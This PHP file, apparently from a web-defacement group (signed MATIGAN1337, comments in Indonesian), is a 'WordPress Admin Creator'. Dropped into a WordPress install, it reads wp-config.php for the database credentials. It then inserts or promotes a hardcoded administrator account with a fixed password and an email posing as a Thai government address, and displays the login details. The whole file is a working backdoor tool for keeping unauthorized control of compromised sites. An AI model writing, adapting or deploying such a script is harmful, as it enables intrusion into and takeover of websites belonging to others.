<?php
// CREATE BY MATIGAN1337 - WORDPRESS VERSION
// Mendapatkan dokumen root (root directory) dari situs web Anda
$document_root = $_SERVER['DOCUMENT_ROOT'];

// Path ke file wp-config.php Anda
$wp_config_path = $document_root . '/wp-config.php';
if (!file_exists($wp_config_path)) {
    $wp_config_path = __DIR__ . '/wp-config.php';
}
if (!file_exists($wp_config_path)) {
    $wp_config_path = dirname(__DIR__) . '/wp-config.php';
}

// Variabel untuk data pengguna
$user = 'officialdatacenter'; // Ganti dengan nama pengguna yang Anda inginkan
$user_password = '4nj3n93n4kb4n93t@!1337%$'; // Ganti dengan kata sandi yang Anda inginkan
$email = 'offcial@datacenter.go.th'; // Ganti dengan alamat email yang Anda inginkan

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WordPress Admin Creator</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #0f172a;
            color: #e2e8f0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            background-color: #1e293b;
            border-radius: 12px;
            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.3), 0 8px 10px -6px rgba(0, 0, 0, 0.3);
            width: 100%;
            max-width: 500px;
            padding: 30px;
            border: 1px solid #334155;
        }
        h2 {
            margin-top: 0;
            color: #38bdf8;
            text-align: center;
            border-bottom: 2px solid #334155;
            padding-bottom: 15px;
        }
        .status-box {
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-weight: 500;
        }
        .success {
            background-color: rgba(16, 185, 129, 0.15);
            border: 1px solid #10b981;
            color: #34d399;
        }
        .error {
            background-color: rgba(239, 68, 68, 0.15);
            border: 1px solid #ef4444;
            color: #f87171;
        }
        .info-table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 15px;
        }
        .info-table td {
            padding: 10px;
            border-bottom: 1px solid #334155;
        }
        .info-table td.label {
            color: #94a3b8;
            font-weight: 600;
            width: 35%;
        }
        .info-table td.value {
            font-family: monospace;
            color: #f1f5f9;
        }
        .footer {
            margin-top: 25px;
            text-align: center;
            font-size: 0.85rem;
            color: #64748b;
        }
    </style>
</head>
<body>
<div class="container">
    <h2>WordPress Admin Creator</h2>
<?php

// Periksa apakah file wp-config.php ada
if (file_exists($wp_config_path)) {
    // Sertakan file wp-config.php
    @require_once($wp_config_path);

    // Sekarang Anda dapat mengakses informasi koneksi database
    $localhost = defined('DB_HOST') ? DB_HOST : 'localhost';
    $database = defined('DB_NAME') ? DB_NAME : '';
    $username = defined('DB_USER') ? DB_USER : '';
    $password = defined('DB_PASSWORD') ? DB_PASSWORD : '';
    global $table_prefix;
    $prefix = isset($table_prefix) ? $table_prefix : 'wp_';

    // Buat koneksi ke database MySQL
    $conn = @mysqli_connect($localhost, $username, $password, $database);

    if (!$conn) {
        echo '<div class="status-box error">Koneksi database gagal: ' . mysqli_connect_error() . '</div>';
    } else {
        // Cek apakah user sudah ada
        $checkUserQuery = "SELECT ID FROM `{$prefix}users` WHERE user_login = '" . mysqli_real_escape_string($conn, $user) . "' OR user_email = '" . mysqli_real_escape_string($conn, $email) . "'";
        $checkResult = @mysqli_query($conn, $checkUserQuery);

        if ($checkResult && mysqli_num_rows($checkResult) > 0) {
            $existingUser = mysqli_fetch_assoc($checkResult);
            $userId = $existingUser['ID'];

            // Jika user sudah ada, pastikan dia administrator
            $sqlUpdateUsermeta1 = "UPDATE `{$prefix}usermeta` SET meta_value = 'a:1:{s:13:\"administrator\";b:1;}' WHERE user_id = $userId AND meta_key = '{$prefix}capabilities'";
            $sqlUpdateUsermeta2 = "UPDATE `{$prefix}usermeta` SET meta_value = '10' WHERE user_id = $userId AND meta_key = '{$prefix}user_level'";
            
            @mysqli_query($conn, $sqlUpdateUsermeta1);
            @mysqli_query($conn, $sqlUpdateUsermeta2);

            // Cek apakah usermeta sudah ada, jika belum di insert
            $checkMeta1 = @mysqli_query($conn, "SELECT umeta_id FROM `{$prefix}usermeta` WHERE user_id = $userId AND meta_key = '{$prefix}capabilities'");
            if (mysqli_num_rows($checkMeta1) == 0) {
                @mysqli_query($conn, "INSERT INTO `{$prefix}usermeta` (umeta_id, user_id, meta_key, meta_value) VALUES (NULL, $userId, '{$prefix}capabilities', 'a:1:{s:13:\"administrator\";b:1;}')");
            }
            
            $checkMeta2 = @mysqli_query($conn, "SELECT umeta_id FROM `{$prefix}usermeta` WHERE user_id = $userId AND meta_key = '{$prefix}user_level'");
            if (mysqli_num_rows($checkMeta2) == 0) {
                @mysqli_query($conn, "INSERT INTO `{$prefix}usermeta` (umeta_id, user_id, meta_key, meta_value) VALUES (NULL, $userId, '{$prefix}user_level', '10')");
            }

            echo '<div class="status-box success">Pengguna "' . htmlspecialchars($user) . '" sudah ada dan sudah diatur sebagai Administrator!</div>';
            echo '<table class="info-table">
                    <tr><td class="label">Username</td><td class="value">' . htmlspecialchars($user) . '</td></tr>
                    <tr><td class="label">Email</td><td class="value">' . htmlspecialchars($email) . '</td></tr>
                    <tr><td class="label">Status</td><td class="value" style="color: #34d399;">Sudah Aktif / Diperbarui</td></tr>
                  </table>';
        } else {
            // Pernyataan SQL untuk memasukkan data ke dalam tabel wp_users
            $sqlInsertUser = "INSERT INTO `{$prefix}users` (user_login, user_pass, user_email, user_status, user_registered, user_nicename) VALUES ('" . mysqli_real_escape_string($conn, $user) . "', MD5('" . mysqli_real_escape_string($conn, $user_password) . "'), '" . mysqli_real_escape_string($conn, $email) . "', '0', NOW(), 'Matigan only')";

            // Jalankan pernyataan SQL untuk memasukkan data ke dalam tabel wp_users
            $insertUserResult = @mysqli_query($conn, $sqlInsertUser);

            // Periksa jika pengguna berhasil dimasukkan
            if ($insertUserResult) {
                // Dapatkan ID pengguna yang dimasukkan
                $userId = mysqli_insert_id($conn);

                // Pernyataan SQL untuk memasukkan data ke dalam tabel wp_usermeta
                $sqlInsertUsermeta1 = "INSERT INTO `{$prefix}usermeta` (umeta_id, user_id, meta_key, meta_value) VALUES (NULL, $userId, '{$prefix}capabilities', 'a:1:{s:13:\"administrator\";b:1;}')";
                $sqlInsertUsermeta2 = "INSERT INTO `{$prefix}usermeta` (umeta_id, user_id, meta_key, meta_value) VALUES (NULL, $userId, '{$prefix}user_level', '10')";

                // Jalankan pernyataan SQL untuk memasukkan data ke dalam tabel wp_usermeta
                $insertUsermetaResult1 = @mysqli_query($conn, $sqlInsertUsermeta1);
                $insertUsermetaResult2 = @mysqli_query($conn, $sqlInsertUsermeta2);

                if ($insertUsermetaResult1 && $insertUsermetaResult2) {
                    echo '<div class="status-box success">Berhasil! Admin WordPress telah dibuat.</div>';
                    echo '<table class="info-table">
                            <tr><td class="label">Username</td><td class="value">' . htmlspecialchars($user) . '</td></tr>
                            <tr><td class="label">Password</td><td class="value">' . htmlspecialchars($user_password) . '</td></tr>
                            <tr><td class="label">Email</td><td class="value">' . htmlspecialchars($email) . '</td></tr>
                            <tr><td class="label">User ID</td><td class="value">' . $userId . '</td></tr>
                            <tr><td class="label">Role</td><td class="value">Administrator</td></tr>
                          </table>';
                } else {
                    echo '<div class="status-box error">Pengguna berhasil dibuat, tetapi error saat memasukkan data tambahan ke dalam tabel wp_usermeta: ' . mysqli_error($conn) . '</div>';
                }
            } else {
                echo '<div class="status-box error">Error saat membuat pengguna baru: ' . mysqli_error($conn) . '</div>';
            }
        }

        // Tutup koneksi database
        mysqli_close($conn);
    }
} else {
    echo '<div class="status-box error">File <strong>wp-config.php</strong> tidak ditemukan. Pastikan script diletakkan di dalam folder instalasi WordPress.</div>';
}
?>
    <div class="footer">
        &copy; 2026 WordPress Admin Creator. Created by MATIGAN1337.
    </div>
</div>
</body>
</html>
